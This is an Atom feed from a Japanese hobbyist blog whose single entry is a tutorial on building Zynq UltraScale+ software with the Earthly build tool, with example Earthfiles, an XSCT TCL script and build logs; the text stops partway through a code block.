<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title>Tosainu Lab</title>
    <link href="https://blog.myon.info/feed.xml" rel="self" />
    <link href="https://blog.myon.info" />
    <id>https://blog.myon.info/feed.xml</id>
    <author>
        <name>Tosainu</name>
        <email>tosainu.maple@gmail.com</email>
    </author>
    <updated>2022-09-19T12:32:00Z</updated>
    <entry>
    <title>とにかく複雑な Zynq のソフトウェアを Earthly でビルドする</title>
    <link href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/index.html" />
    <id>https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/index.html</id>
    <published>2022-09-19T12:32:00Z</published>
    <updated>2022-09-19T12:32:00Z</updated>
    <summary type="html"><![CDATA[<p>Zynq はソフトウェアだけにフォーカスしても構成するものが多く、動かすまでがとにかく大変です。Zynq UltraScale+ MPSoC をターゲットにして、APU で Linux を動かしつつ、RPU ではベアメタルアプリケーションを動かして相互に通信…とかやっていくのは実際気の遠くなる作業です。おまけに各種ツールが絶妙にアレなので、この規模にもなると edit-build-run のループを回すのに一苦労です。</p>
<p>Zynq に限らず、規模の大きくなったソフトウェアは edit-build-run あるいは build-test-release-deploy 一連のタスクが複雑になりがちです。複数のプログラミング言語やライブラリが絡むために異なるツールを呼び出さないといけなかったり、ビルドした個々のソフトウェアをパッケージするためにビルドツールを伴わないファイル操作などが絡んだり…。クリーンな状態から1度だけの実行を想定したものでよければ適当なスクリプトで解決するかもしれません。でも普段の開発での利用も想定すると、個々のビルドプロセスとその依存関係を適切に管理できたり、キャッシュなどを使って必要なところだけをいい感じにビルドし直してくれたりするもの、言葉にするなら <em>Build automation tool</em> がほしくなってきます。</p>
<p>なにかいいツールがないかなーと探し回り、あるときはいっそ自分で作ってやろうかと考えたこともありました。そんなときに見つけたのが <a href="https://earthly.dev/">Earthly</a> です。これが自分が探していたものにかなり近く、Zynq ソフトウェアプロジェクトをはじめ様々な用途で使ってみていい感じだったので紹介しようとおもいます。</p>
<!--more-->
<h2 id="earthly">Earthly</h2>
<p><a href="https://earthly.dev/">Earthly</a> はコンテナを活用した Build automation tool です。<code>Makefile</code> と <code>Dockerfile</code> を組み合わせたかのような <code>Earthfile</code> を見れば、これがどんなことをしてくれるものなのかすぐにイメージできるんじゃないかなと思います。実際、Earthly は buikdkit をバックエンドに使っていて、Docker の <a href="https://docs.docker.com/develop/develop-images/multistage-build/">multi-stage build</a> にかなり近い動作をします。各ターゲットはそれぞれ独立したコンテナ環境で実行されるので、ちゃんと設定さえすればどの実行環境でもほぼ同じビルドが再現できますし、ある別のターゲットで作られたものやリポジトリ管理外のファイルを暗黙的に参照してしまうこともありません。また、ターゲット間の依存関係に問題なければ可能な限り並列で実行してくれたり、一度実行したターゲットは自身が依存するファイルや別のターゲットに変更がない限りキャッシュが効いてくれるのもポイントです。これだけの利点がありながら、Earthly の導入作業は基本的には普段の dockerize と同じ感覚なので、個々のビルド方法自体は大きく変えなくてよく、比較的敷居が低いのも強みです。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb1-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-1" aria-hidden="true" tabindex="-1"></a>hoge:</span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> alpine</span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="bu">echo</span> <span class="st">&quot;Hoge!&quot;</span> <span class="op">&gt;</span> awesome.txt</span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-4" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT awesome.txt</span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-6" aria-hidden="true" tabindex="-1"></a>fuga:</span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> alpine</span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="bu">echo</span> <span class="st">&quot;Fuga!&quot;</span> <span class="op">&gt;</span> awesome.txt</span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-9" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT awesome.txt</span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-11" aria-hidden="true" tabindex="-1"></a>myon:</span>
<span id="cb1-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> alpine</span>
<span id="cb1-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +hoge/awesome.txt a.txt</span>
<span id="cb1-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +fuga/awesome.txt b.txt</span>
<span id="cb1-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-15" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">cat</span> a.txt b.txt <span class="op">&gt;</span> awesome.txt</span>
<span id="cb1-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb1-16" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT awesome.txt</span></code></pre></div>
<p>Earthly のインストールは、<a href="https://earthly.dev/get-earthly">公式の手順</a>の通りビルド済みのバイナリを使うのが簡単です。ただ自分なら不必要に root で作業したくないので、例えばインストール先は <code>~/.local/bin</code> にして、また <code>/usr</code> 下に書き込もうとしてくる <code>earthly bootstrap --with-autocomplete</code> は実行しないと思います<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。</p>
<pre><code>$ curl -L https://github.com/earthly/earthly/releases/latest/download/earthly-linux-amd64 \
    -o ~/.local/bin/earthly
$ chmod +x $_</code></pre>
<p>インストールが済んだら早速 Earthly を動かしてみます。適当な場所に空のディレクトリを作り、そこに先ほどあげた <code>Earthfile</code> の例を保存してください。<code>Earthfile</code> に定義されたあるターゲットを実行するには <code>earthly +&lt;ターゲット名&gt;</code> を実行します。例えば <code>hoge</code> と <code>fuga</code> を実行するならそれぞれこうなります。</p>
<pre><code>$ earthly +hoge
$ earthly +fuga</code></pre>
<p>ターゲット <code>myon</code> は <code>hoge</code> と <code>fuga</code> で作ったファイルに依存しています。あるターゲットで作ったものを後段のタスクや Earthly 実行ホストに渡すには、そのファイルを <a href="https://docs.earthly.dev/docs/earthfile#save-artifact"><code>SAVE ARTIFACT</code></a> コマンドで指定します。そして、別のターゲットからそれを参照するには <a href="https://docs.earthly.dev/docs/earthfile#copy"><code>COPY</code></a> コマンドを使います。</p>
<p>実際に <code>myon</code> を動かしてみると、<code>myon</code> が依存するターゲットである <code>hoge</code> と <code>fuga</code> が実行されようとしたこと、またそれらターゲットは先程ビルドしたばかりなのでキャッシュが参照されたことがわかります。</p>
<pre><code> 2. Build 🔧
————————————————————————————————————————————————————————————————————————————————

      alpine | --&gt; Load metadata linux/amd64
       +fuga | --&gt; FROM alpine
       +fuga | [██████████] 100% resolve docker.io/library/alpine@sha256:bc41182d7ef5ffc53a40b044e725193bc10142a1243f395ee852a8d9730fc2ad
       +fuga | *cached* --&gt; RUN echo &quot;Fuga!&quot; &gt; awesome.txt
       +hoge | *cached* --&gt; RUN echo &quot;Hoge!&quot; &gt; awesome.txt
       +hoge | --&gt; SAVE ARTIFACT awesome.txt +hoge/awesome.txt
       +fuga | --&gt; SAVE ARTIFACT awesome.txt +fuga/awesome.txt
       +myon | --&gt; COPY +hoge/awesome.txt a.txt
       +myon | --&gt; COPY +fuga/awesome.txt b.txt
       +myon | --&gt; RUN cat a.txt b.txt &gt; awesome.txt
      output | --&gt; exporting outputs</code></pre>
<p>Earthly で作られたものを実行ホスト側に持ってくるには <code>earthly --artifact</code> コマンドを使います。<code>myon</code> で作ったファイル <code>awesome.txt</code> をカレントディレクトリ直下の <code>build/</code> にコピーするならこうなります。コピー先として渡すパスは末尾を必ず <code>/</code> にします。また先程カレントディレクトリと書きましたが、Earthly は相対パス受け取ったとき、それが <code>Earthfile</code> のあるディレクトリを基準としたものと解釈するのにも注意です。ターゲットからコピーするファイルの指定には <code>*</code> が使えます。たぶん Go 製アプリにありがちな <a href="https://pkg.go.dev/path/filepath#Match"><code>filepath.Match</code></a> を使うやつです。シェルの設定次第では <code>*</code> を glob として展開しちゃう場合があるのでエスケープしておくと安心です。</p>
<pre><code>$ earthly --artifact +myon/awesome.txt ./build/

$ earthly --artifact +myon/\* ./build/</code></pre>
<p>Earthly の主要操作はだいたいこんな感じです。基本的には <code>Dockerfile</code> と同じなので、Docker を使ったことさえあればあまり難しいことはないと思います。</p>
<h2 id="実際に-zynq-をターゲットにした何かを作ってみる">実際に Zynq をターゲットにした何かを作ってみる</h2>
<h3 id="l-チカ">L チカ…？</h3>
<p>それでは本題、Earthly をどうやって Zynq UltraScale+ のソフトウェアプロジェクトに適用したかです。この紹介にあたって、こんなものを作ってみました。</p>
<video controls loop>
<source src="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/led.mp4" type="video/mp4">
</video>
<p>一言でいえば、特に理由もなく面倒なことをしている L チカの亜種です。RPU で動く LED 制御のベアメタルアプリケーションと APU 上の Ubuntu で動くアプリケーションが IPI (Inter-Processor Interrupt) を飛ばし合います。APU から RPU への IPI で LED 点滅開始、その後 APU が RPU から飛んでくる IPI に応答し続けないと LED は消えてしまうというものです。題材を複雑にしすぎても準備が大変なだけだし、かといって簡単にしすぎてもおもしろくないし…と悩んだ末のものになります。ソースコードはすべて GitHub リポジトリ <a href="https://github.com/Tosainu/earthly-zynqmp-example">Tosainu/earthly-zynqmp-example</a> にあり、この記事は <a href="https://github.com/Tosainu/earthly-zynqmp-example/tree/322ce449da698ac1db1641cf12240bbfaa36d6eb"><code>322ce449</code></a> をベースに書いています。</p>
<p>ちなみに、FPGA としての機能をほぼ使っていないのでブロックデザインは実質 PS だけです。Ultra96 ちゃん、XCZU3EG-1SBVA484E ちゃんごめんね…</p>
<h3 id="コンテナ内に必要なツールをそろえる">コンテナ内に必要なツールをそろえる</h3>
<p>最初に書く <code>Earthfile</code> のターゲットが、ビルドなど全体のタスク実行に必要なツール類をインストールしてベースイメージのように使うものです。ほかのターゲットから <code>FROM +prep</code> みたいにして使います。</p>
<p>必要になるのは RPU と APU で動かすアプリケーションをビルドするクロスコンパイラ、ディスクイメージ作成のためにファイルシステムやパーティションテーブル操作系のツール、そして <code>.xsa</code> から BSP や FSBL, PMUFW などを生成するための Xilinx のツール類です。クロスコンパイラの大半と Xilinx のツール類は、PetaLinux Tools などで使われているらしい <a href="https://github.com/Xilinx/meta-xilinx-tools/blob/e2ff6325931b008565f558cb35ac38dfb01116c9/classes/xsct-tarball.bbclass#L7">xsct-trim</a> から拝借しました。xsct-trim には AArch64 Linux 向けクロスコンパイラは入っていないので、かわりに Ubuntu の <code>crossbuild-essential-arm64</code> パッケージを使うことにしました。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb6-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-1" aria-hidden="true" tabindex="-1"></a>prep:</span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> ubuntu:jammy@sha256:20fa2d7bb4de7723f542be5923b06c4d704370f0390e4ae9e1c833c8785644c1</span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">apt-get</span> update <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-5" aria-hidden="true" tabindex="-1"></a>        <span class="va">DEBIAN_FRONTEND</span><span class="op">=</span>noninteractive <span class="ex">apt-get</span> install <span class="at">-y</span> <span class="at">--no-install-recommends</span> <span class="dt">\</span></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-6" aria-hidden="true" tabindex="-1"></a>            autoconf automake bc bison build-essential ca-certificates cmake cpio <span class="dt">\</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-7" aria-hidden="true" tabindex="-1"></a>            crossbuild-essential-arm64 curl dbus-x11 dosfstools e2fsprogs fdisk flex gzip <span class="dt">\</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-8" aria-hidden="true" tabindex="-1"></a>            kmod libncurses-dev libssl-dev libtinfo5 libtool-bin locales rsync xz-utils zstd <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-9" aria-hidden="true" tabindex="-1"></a>        <span class="fu">rm</span> <span class="at">-rf</span> /var/lib/apt/lists/<span class="pp">*</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">sed</span> <span class="at">-i</span> <span class="st">'s/^#\s*\(en_US.UTF-8\)/\1/'</span> /etc/locale.gen <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-11" aria-hidden="true" tabindex="-1"></a>        <span class="ex">dpkg-reconfigure</span> <span class="at">--frontend</span> noninteractive locales</span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> XSCT_URL=https://petalinux.xilinx.com/sswreleases/rel-v2022/xsct-trim/xsct-2022-1.tar.xz</span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> XSCT_SHA256SUM=e343a8b386398e292f636f314a057076e551a8173723b8ea0bc1bbd879c05259</span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">--mount=type=tmpfs,target=/tmp</span> <span class="op">\</span></span>
<span id="cb6-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-15" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">--no-progress-meter</span> <span class="at">-L</span> <span class="st">&quot;</span><span class="va">${XSCT_URL}</span><span class="st">&quot;</span> <span class="at">-o</span> /tmp/xsct.tar.xz <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-16" aria-hidden="true" tabindex="-1"></a>        <span class="bu">echo</span> <span class="st">&quot;</span><span class="va">${XSCT_SHA256SUM}</span><span class="st"> /tmp/xsct.tar.xz&quot;</span> <span class="kw">|</span> <span class="fu">sha256sum</span> <span class="at">-c</span> <span class="at">-</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-17" aria-hidden="true" tabindex="-1"></a>        <span class="fu">mkdir</span> <span class="at">-p</span> /opt/xsct <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb6-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-18" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf /tmp/xsct.tar.xz <span class="at">-C</span> /opt/xsct <span class="at">--strip-components</span><span class="op">=</span>2</span>
<span id="cb6-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-19" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ENV</span> PATH=<span class="st">&quot;/opt/xsct/bin:/opt/xsct/gnu/aarch64/lin/aarch64-none/bin:/opt/xsct/gnu/armr5/lin/gcc-arm-none-eabi/bin:/opt/xsct/gnu/microblaze/lin/bin:${PATH}&quot;</span></span>
<span id="cb6-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb6-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">WORKDIR</span> /build</span></code></pre></div>
<p>今回は <code>Earthfile</code> の中にこうしたターゲットを書いていますが、よりビルドの再現性を重視したいのであれば別のアプローチを取るべきです。<code>apt-get</code> などのコマンドは、パッケージの更新などのために実行するタイミングで結果が大きく変わりうるためです。対策の一例としては、この部分だけ独立したコンテナイメージ化し、レジストリで管理するなどがあると思います。</p>
<h3 id="xsct-trim-で-fsbl-pmufw-bsp-devicetree-を出力させる">xsct-trim で FSBL, PMUFW, BSP, Devicetree を出力させる</h3>
<p>次は FSBL、PMUFW、RPU ベアメタルアプリケーションの BSP、そして Devicetree のテンプレートなど、Vitis でいう platform に相当するものたちを xsct-trim に入っている <a href="https://docs.xilinx.com/r/en-US/ug1400-vitis-embedded/XSCT-Commands">XSCT</a> に出力させます。</p>
<p>いつもの XSCT コマンドを並べた TCL スクリプトを作っておきます。コマンドラインから <code>.xsa</code> ファイルのパスを受け取ったり、<code>Earthfile</code> 側から <code>.bit</code> ファイルを常に同じファイル名で扱えるように symlink を張るようにもしておきます。</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode tcl"><code class="sourceCode tcl"><span id="cb7-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">set</span> xsa_file <span class="kw">[lindex</span> <span class="dt">$argv</span> <span class="dv">0</span><span class="kw">]</span></span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-3" aria-hidden="true" tabindex="-1"></a>hsi open_hw_design <span class="dt">$xsa_file</span></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="kw">set</span> bit_file <span class="kw">[lindex</span> <span class="kw">[</span>hsi get_hw_files<span class="ot"> -filter</span> <span class="kw">{</span>TYPE==bit<span class="kw">}]</span> <span class="dv">0</span><span class="kw">]</span></span>
<span id="cb7-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="kw">file</span> <span class="ot">link -symbolic</span> <span class="ot">system</span>.bit <span class="dt">$bit_file</span></span>
<span id="cb7-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-8" aria-hidden="true" tabindex="-1"></a>hsi set_repo_path embeddedsw</span>
<span id="cb7-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-10" aria-hidden="true" tabindex="-1"></a>hsi create_sw_design fsbl<span class="ot"> -proc</span> psu_cortexa53_0<span class="ot"> -os</span> standalone</span>
<span id="cb7-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-11" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.stdin  psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-12" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.stdout psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-13" aria-hidden="true" tabindex="-1"></a>hsi add_library xilffs</span>
<span id="cb7-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-14" aria-hidden="true" tabindex="-1"></a>hsi add_library xilpm</span>
<span id="cb7-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-15" aria-hidden="true" tabindex="-1"></a>hsi add_library xilsecure</span>
<span id="cb7-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-16" aria-hidden="true" tabindex="-1"></a>hsi generate_app<span class="ot"> -app</span> zynqmp_fsbl<span class="ot"> -dir</span> fsbl</span>
<span id="cb7-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-17" aria-hidden="true" tabindex="-1"></a>hsi close_sw_design <span class="kw">[</span>hsi current_sw_design<span class="kw">]</span></span>
<span id="cb7-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-19" aria-hidden="true" tabindex="-1"></a>hsi create_sw_design pmufw<span class="ot"> -proc</span> psu_pmu_0<span class="ot"> -os</span> standalone</span>
<span id="cb7-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-20" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.stdin  psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-21"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-21" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.stdout psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-22"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-22" aria-hidden="true" tabindex="-1"></a>hsi add_library xilfpga</span>
<span id="cb7-23"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-23" aria-hidden="true" tabindex="-1"></a>hsi add_library xilsecure</span>
<span id="cb7-24"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-24" aria-hidden="true" tabindex="-1"></a>hsi add_library xilskey</span>
<span id="cb7-25"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-25" aria-hidden="true" tabindex="-1"></a>hsi generate_app<span class="ot"> -app</span> zynqmp_pmufw<span class="ot"> -dir</span> pmufw</span>
<span id="cb7-26"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-26" aria-hidden="true" tabindex="-1"></a>hsi close_sw_design <span class="kw">[</span>hsi current_sw_design<span class="kw">]</span></span>
<span id="cb7-27"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-28"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-28" aria-hidden="true" tabindex="-1"></a>hsi create_sw_design bsp_psu_cortexr5_0<span class="ot"> -proc</span> psu_cortexr5_0<span class="ot"> -os</span> standalone</span>
<span id="cb7-29"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-29" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.stdin  psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-30"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-30" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.stdout psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-31"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-31" aria-hidden="true" tabindex="-1"></a><span class="co"># hsi add_library xilffs</span></span>
<span id="cb7-32"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-32" aria-hidden="true" tabindex="-1"></a><span class="co"># hsi add_library xilfpga</span></span>
<span id="cb7-33"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-33" aria-hidden="true" tabindex="-1"></a><span class="co"># hsi add_library xilmailbox</span></span>
<span id="cb7-34"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-34" aria-hidden="true" tabindex="-1"></a><span class="co"># hsi add_library xilpm</span></span>
<span id="cb7-35"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-35" aria-hidden="true" tabindex="-1"></a><span class="co"># hsi add_library xilsecure</span></span>
<span id="cb7-36"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-36" aria-hidden="true" tabindex="-1"></a><span class="co"># hsi add_library xilskey</span></span>
<span id="cb7-37"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-37" aria-hidden="true" tabindex="-1"></a>hsi generate_bsp<span class="ot"> -dir</span> bsp_psu_cortexr5_0</span>
<span id="cb7-38"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-38" aria-hidden="true" tabindex="-1"></a>hsi close_sw_design <span class="kw">[</span>hsi current_sw_design<span class="kw">]</span></span>
<span id="cb7-39"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-40"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-40" aria-hidden="true" tabindex="-1"></a>hsi set_repo_path device-tree-xlnx</span>
<span id="cb7-41"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-42"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-42" aria-hidden="true" tabindex="-1"></a>hsi create_sw_design device-tree<span class="ot"> -proc</span> psu_cortexa53_0<span class="ot"> -os</span> device_tree</span>
<span id="cb7-43"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-43" aria-hidden="true" tabindex="-1"></a>hsi set_property CONFIG.console_device psu_uart_1 <span class="kw">[</span>hsi get_os<span class="kw">]</span></span>
<span id="cb7-44"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb7-44" aria-hidden="true" tabindex="-1"></a>hsi generate_target<span class="ot"> -dir</span> device-tree</span></code></pre></div>
<p>あとはこれを <code>xsct</code> に実行させれば OK です。ビルド時に可変なパラメータを宣言する <a href="https://docs.earthly.dev/docs/earthfile#arg"><code>ARG</code></a> で <code>.xsa</code> ファイルへのパスを渡せるようにしておきます。生成したファイルは全部 <code>SAVE ARTIFACT</code> して別のターゲットから取り出せるようにしておきます。FSBL, PMUFW, BSP のビルドはそれぞれ独立したターゲットにして、ターゲット単位のビルド並列化が効くようにします<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb8-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-1" aria-hidden="true" tabindex="-1"></a>generate-src:</span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> --required XSA_FILE</span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +xsct</span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> generate.tcl .</span>
